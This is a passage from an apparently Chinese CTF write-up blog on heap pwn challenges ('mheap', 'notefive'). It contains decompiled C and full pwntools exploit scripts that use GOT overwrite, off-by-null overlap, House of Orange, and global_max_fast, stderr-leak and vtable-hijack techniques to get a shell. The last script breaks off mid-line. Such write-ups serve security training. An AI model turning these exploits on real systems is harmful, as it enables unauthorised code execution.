+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">readd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">signed</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx;</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    count = read(<span class="number">0</span>, &amp;buf[idx], size - idx);     <span class="comment">// overflow</span></span><br><span class="line">    <span class="keyword">if</span> ( !count )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    idx += count;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)buf[idx - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)result != <span class="number">10</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现函数只对返回值是否为0进行了检查,没有对函数返回失败进行检查</p>
+<p>通常read函数很少会返回失败,但是由于这道题自己申请了一段内存,所以很容易越界读造成返回错误,因此造成了函数的反向溢出,就像开头说的,这道题如果存在漏洞就很容易攻击,针对这道题由于没有开PIE所以直接攻击got表即可</p>
+<p>这里存在疑问的是不知道为什么read函数在返回失败后还是会保存缓冲区中的数据(其实用缓冲区并不准确因为read函数没有缓冲区?)</p>
+<hr>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, aslr=<span class="literal">False</span>, terminal=[<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./mheap'</span></span><br><span class="line">lib = <span class="string">'./libc-2.27.so'</span></span><br><span class="line">ip = <span class="string">'112.126.98.5'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ld(exe, lib)</span><br><span class="line">libc = ELF(lib) <span class="keyword">if</span> lib <span class="keyword">else</span> elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(opt, idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Your choice: '</span>, str(opt))</span><br><span class="line">    io.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>, idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Input size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>, idx)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">onegadgets = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0xD00</span><span class="number">-0x10</span>, <span class="string">'A'</span>*(<span class="number">0xD00</span><span class="number">-0x10</span>))</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'B'</span>*(<span class="number">0x100</span><span class="number">-0x10</span>))</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------overflow----------</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += <span class="string">'C'</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(elf.got[<span class="string">'__stack_chk_fail'</span>])</span><br><span class="line">    payload += <span class="string">'D'</span>*(<span class="number">0x300</span><span class="number">-0x10</span><span class="number">-1</span>)+<span class="string">'\n'</span></span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x300</span><span class="number">-0x10</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------leak--------------</span></span><br><span class="line">    new(<span class="number">3</span>, elf.plt[<span class="string">'__stack_chk_fail'</span>]<span class="number">-0x10</span>, p64(elf.plt[<span class="string">'printf'</span>]+<span class="number">6</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line">    libc.address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#----------getshell----------</span></span><br><span class="line">    edit(<span class="number">3</span>, p64(libc.address+onegadgets[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        io = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>: libc.path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="notefive"><a href="#notefive" class="headerlink" title="notefive**"></a>notefive**</h2><hr>
+<h3 id="题目信息-2"><a href="#题目信息-2" class="headerlink" title="题目信息"></a>题目信息</h3><blockquote>
+<p>nc 112.126.103.195 9999</p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/56bcec9787b943fdb9e5285a3b165763.zip" target="_blank" rel="noopener">点击下载附件 1</a></p>
+</blockquote>
+<hr>
+<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file note_five </span><br><span class="line">note_five: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=99cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped</span><br><span class="line">$ checksec note_five </span><br><span class="line">[!] Couldn<span class="string">'t find relocations against PLT to get symbols</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="string">    Stack:    No canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>程序存在一个offbynull,并且只能申请size&gt;0x8f,由于无法申请fastbin,因此无法fastbin attack,第一个想到的是通过<code>HouseOfOrange</code>,理论上爆破一个半字节即可,不过不知道是人品还是什么原因,本地爆破成功但是远程不行,贴一下exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'info'</span>, arch=<span class="string">'amd64'</span>, aslr=<span class="literal">True</span>, os=<span class="string">'linux'</span>, terminal=[<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./note_five'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'112.126.103.195'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(lib) <span class="keyword">if</span> lib <span class="keyword">else</span> elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(opt, idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    io.sendline(str(opt)+<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">    io.sendline(str(idx)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>, idx)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(size)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content, end=False)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>, idx)</span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        io.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">'content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">script = <span class="string">''</span></span><br><span class="line">script += <span class="string">'b _IO_flush_all_lockp\n'</span></span><br><span class="line">script += <span class="string">'directory /opt/glibc/tar/glibc-2.23/libio\n'</span></span><br><span class="line">script += <span class="string">'c\n'</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"> <span class="comment">#----------overlap----------</span></span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0xb0</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x310</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xa0</span><span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'\x00'</span>*<span class="number">0x2f0</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0xa8</span>+<span class="string">'\x00'</span>, end=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0x150</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0x150</span><span class="number">-8</span>)  <span class="comment"># overlap</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------fake vtable-------</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0xa0</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0xa0</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x220</span><span class="number">-8</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0xb0</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0xb0</span><span class="number">-8</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'C'</span>*<span class="number">0x8</span>+p64(<span class="number">0x131</span>)+<span class="string">'C'</span>*<span class="number">0x128</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'D'</span>*<span class="number">0x8</span>+p64(<span class="number">0x131</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x2520</span><span class="number">-0x10</span>))</span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0x130</span><span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0xb0</span><span class="number">-8</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0xb0</span><span class="number">-8</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'E'</span>*<span class="number">8</span>+<span class="string">'\x90\x23\xa5'</span>);</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'F'</span>*<span class="number">0x150</span>+<span class="string">'/bin/sh\x00'</span>+<span class="string">'F'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#dbg(script)</span></span><br><span class="line"></span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'[vsyscall]\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    flag = io.recv()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> LOCAL:</span><br><span class="line">                io = elf.process()<span class="comment">#env=&#123;"LD_PRELOAD": libc.path&#125;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">            flag = exp()</span><br><span class="line">            log.info(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>另一个思路是通过打<code>global_max_fast</code>,这个算是比较老的攻击方式了,第一次见还是在秦师傅的博客</p>
+<p>我们可以通过打<code>global_max_fast</code>来获得更大size的fastbin,比如<code>0xff</code>,在<code>IOFILE</code>结构体中恰好有一个成员的值总是为<code>0xffffffff</code>,因此可以申请到<code>stderr</code>来修改stdout从而造成泄漏,再之后通过劫持vtable来getshell</p>
+<p>这里存在另一个思路是再通过fastbin attack攻击stdin,通过两次攻击可以覆盖到malloc_hook从而getshell</p>
+<hr>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, terminal=[<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./note_five'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'112.126.103.195'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(lib) <span class="keyword">if</span> lib <span class="keyword">else</span> elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(opt, idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    io.sendline(str(opt)+<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">    io.sendline(str(idx)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>, idx)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(size)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content, end=False)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>, idx)</span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        io.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">'content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">libc_off = <span class="number">0x3c5640</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#----------overlap--------------------------------</span></span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x98</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x210</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x98</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'A'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x98</span>+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0xa8</span>)</span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0x108</span>)    <span class="comment"># overlap</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------unsrotedbin attack---------------------</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'C'</span>*<span class="number">0xa8</span>+p64(<span class="number">0xf1</span>)+<span class="string">'C'</span>*<span class="number">0xe8</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'D'</span>*<span class="number">0xa8</span>+p64(<span class="number">0xf1</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span>))     <span class="comment"># global_max_fast</span></span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------fastbin attack-------------------------</span></span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'E'</span>*<span class="number">0xa8</span>+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25b7</span>))                 <span class="comment"># stderr</span></span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0xe8</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0xe8</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'\x00'</span>*<span class="number">0x59</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x40</span>))</span><br><span class="line">    libc.address = u64(io.recv(<span class="number">8</span>)) - libc_off</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------hijack vtable--------------------------</span></span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'E'</span>*<span class="number">0xa8</span>+p64(<span 